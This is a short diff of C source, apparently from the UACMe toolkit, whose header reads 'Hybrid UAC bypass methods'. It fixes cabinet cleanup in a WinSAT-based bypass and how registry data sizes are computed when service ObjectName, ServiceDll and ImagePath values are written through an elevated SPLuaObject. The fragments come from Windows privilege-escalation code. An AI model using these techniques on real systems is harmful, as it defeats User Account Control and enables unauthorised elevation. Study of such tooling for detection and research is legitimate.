@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.17
 *
-*  DATE:        18 Mar 2019
+*  DATE:        20 Mar 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -260,7 +260,6 @@ NTSTATUS ucmWinSATMethod(
                 //put winsat.exe
                 cabAddFile(Cabinet, szDest, WINSAT_EXE);
                 cabClose(Cabinet);
-                Cabinet = NULL;
             }
             else {
                 break;
@@ -298,9 +297,6 @@ NTSTATUS ucmWinSATMethod(
             MethodResult = STATUS_SUCCESS;
     }
 
-    if (Cabinet) {
-        cabClose(Cabinet);
-    }
     //remove trash from %temp%
     if (szDest[0] != 0) {
         DeleteFileW(szDest);
@@ -3024,7 +3020,8 @@ BOOL ucmxSetResetW32TimeSvcParams(
         //
         // Set ObjectName. 
         //  
-        DataSize = ((ULONG)_strlen(szLocal) * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+
+        DataSize = (ULONG)((1 + _strlen(szLocal)) * sizeof(WCHAR));
         hr = ucmSPLUAObjectRegSetValue(
             SPLuaObject,
             SSLUA_HKEY_LOCAL_MACHINE,
@@ -3040,7 +3037,7 @@ BOOL ucmxSetResetW32TimeSvcParams(
             // Set ServiceDll.
             //
             if (g_ctx->dwBuildNumber >= 10240) {
-                DataSize = ((ULONG)_strlen(pServiceDll) * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+                DataSize = (ULONG)((1 + _strlen(pServiceDll)) * sizeof(WCHAR));
                 hr = ucmSPLUAObjectRegSetValue(
                     SPLuaObject,
                     SSLUA_HKEY_LOCAL_MACHINE,
@@ -3088,7 +3085,7 @@ BOOL ucmxSetResetW32TimeSvcParams(
             //
             // Set service imagepath.
             //
-            DataSize = ((ULONG)_strlen(pImagePath) * sizeof(WCHAR)) + sizeof(UNICODE_NULL);
+            DataSize = (ULONG)((1 + _strlen(pImagePath)) * sizeof(WCHAR));
             hr = ucmSPLUAObjectRegSetValue(
                 SPLuaObject,
                 SSLUA_HKEY_LOCAL_MACHINE,
